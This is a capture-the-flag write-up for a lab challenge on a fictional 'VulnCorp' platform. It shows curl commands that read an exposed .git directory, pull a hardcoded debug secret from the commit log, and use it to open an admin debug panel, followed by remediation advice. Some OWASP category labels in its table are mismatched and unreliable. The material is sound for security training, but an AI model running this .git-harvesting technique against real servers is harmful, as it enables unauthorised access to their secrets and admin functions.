# VulnCorp CTF - Flag 1 Write-up

## Debug Admin Panel Access through Exposed Git Secrets

### Challenge Objective

Identify and exploit security vulnerabilities to retrieve the flag from the debug admin panel accessed through secrets leaked in the exposed git commit history.

**Flag Obtained:** `FLAG{S3CUR1TY_M1SC0NF1G_D3BUG_L3AK}`

---

## Vulnerability Chain

This flag requires exploiting **multiple interconnected vulnerabilities**:

1. **Exposed Git Repository** (Information Disclosure)
2. **Hardcoded Secrets in Commit History** (Sensitive Data Exposure)
3. **Insecure Debug Panel** (Broken Access Control)

---

## Exploitation Steps

### Step 1: Discover the Service

**Target:** `http://10.5.22.62:8080`

The VulnCorp AI platform was running on port 8080 (not the standard port 80).

```bash
curl http://10.5.22.62:8080/
```

### Step 2: Identify Exposed Git Repository

The `.git` directory was publicly accessible, indicating the source control repository was exposed to the internet.

```bash
curl http://10.5.22.62:8080/.git/HEAD
# Output: ref: refs/heads/main
```

**Vulnerability:** Directory traversal / exposed sensitive directories

---

### Step 3: Extract Git Commit History

The git logs directory was also accessible, revealing the entire commit history including sensitive information.

```bash
curl -s http://10.5.22.62:8080/.git/logs/HEAD
```

**Key Output:**

```
0000000000000000000000000000000000000000 a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0 deploy-bot <deploy@vulncorp.ai> 1706140800 +0000      commit (initial): Initial platform setup

a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0 b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1 sarah.chen <sarah@vulncorp.ai> 1708819200 +0000       commit: Add user authentication module

b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1 c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2 mike.johnson <mike@vulncorp.ai> 1711497600 +0000      commit: Add debug panel with secret=xK9#mQ2$vL5 for admin diagnostics

c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2 d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3 deploy-bot <deploy@vulncorp.ai> 1714176000 +0000      commit: Remove hardcoded debug secret (moved to vault)

d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3 e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4 sarah.chen <sarah@chen.ai> 1716854400 +0000       commit: Add AI chatbot integration

e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4 f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5 deploy-bot <deploy@vulncorp.ai> 1719532800 +0000      commit: Production deployment v2.1.0
```

**Vulnerability:** Git history contains secrets that should never be committed to version control.

---

### Step 4: Extract the Leaked Secret

In commit `c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2` by mike.johnson, the debug panel secret was exposed:

```
secret=xK9#mQ2$vL5
```

**Vulnerability:** Hardcoded credentials / secrets management failure

---

### Step 5: Discover the Debug Panel Endpoint

By analyzing the application's API documentation (accessible at `/login` after guest login), the following restricted endpoint was documented:

```
GET /debug/admin-panel?secret=
```

This endpoint requires a secret parameter but lacks proper authentication.

**Vulnerability:** Insecure Direct Object Reference (IDOR) / Broken Access Control

---

### Step 6: Access the Debug Admin Panel

Using the leaked secret, access the debug panel:

```bash
curl -s "http://10.5.22.62:8080/debug/admin-panel?secret=xK9%23mQ2%24vL5"
```

**URL Encoding Note:**

- `#` → `%23`
- `$` → `%24`

**Response:**

```json
{
  "message": "Debug Admin Panel Access Granted",
  "flag": "FLAG{S3CUR1TY_M1SC0NF1G_D3BUG_L3AK}",
  "system_info": {
    "node_version": "v20.20.0",
    "env": "development",
    "uptime": 1514.649651226,
    "memory": {
      "rss": 65724416,
      "heapTotal": 13234176,
      "heapUsed": 10954528,
      "external": 3429216,
      "arrayBuffers": 81302
    }
  }
}
```

---

## Flag

```
FLAG{S3CUR1TY_M1SC0NF1G_D3BUG_L3AK}
```

---

## Security Issues Identified

|Vulnerability|OWASP Category|Severity|Root Cause|
|---|---|---|---|
|Exposed Git Repository|A01:2025 - Broken Access Control|**CRITICAL**|`.git` directory publicly accessible|
|Hardcoded Secrets in VCS|A05:2025 - Vulnerable and Outdated Components|**CRITICAL**|Secrets committed to git history|
|Insecure Debug Panel|A01:2025 - Broken Access Control|**CRITICAL**|Weak/guessable secret parameter|
|Development Mode in Production|A06:2025 - Vulnerable and Outdated Components|**HIGH**|`env: "development"` in production|

---

## Remediation

### Immediate Actions:

1. **Remove .git from production:** Ensure `.git` directory is not web-accessible
    
    ```bash
    # In .htaccess or web server config
    <Directory ~ "\.git">
        Deny from all
    </Directory>
    ```
    
2. **Rotate the leaked secret:** The secret `xK9#mQ2$vL5` is now compromised
    
3. **Use proper secrets management:**
    
    - Implement HashiCorp Vault, AWS Secrets Manager, or Azure Key Vault
    - Never commit secrets to git
    - Use `.gitignore` for sensitive files
4. **Disable debug mode in production:**
    
    ```javascript
    // Instead of: env: "development"
    if (process.env.NODE_ENV === 'production') {
        debugPanel.enabled = false;
    }
    ```
    
5. **Implement proper authentication:**
    
    - Don't use simple query parameters for sensitive endpoints
    - Require proper authentication tokens (JWT, OAuth2)
    - Implement rate limiting

### Long-term Solutions:

- Use `git-secrets` or `pre-commit` hooks to prevent credential commits
- Implement secret scanning in CI/CD pipeline
- Regular security audits and penetration testing
- Security awareness training for developers

---

## References

- OWASP Top 10 2025: https://owasp.org/Top10/
- Git Security Best Practices: https://git-scm.com/book/en/v2/Git-Tools-Signing-Your-Work
- Secret Management: https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html


_Writeup by: obito  | ine_ctf
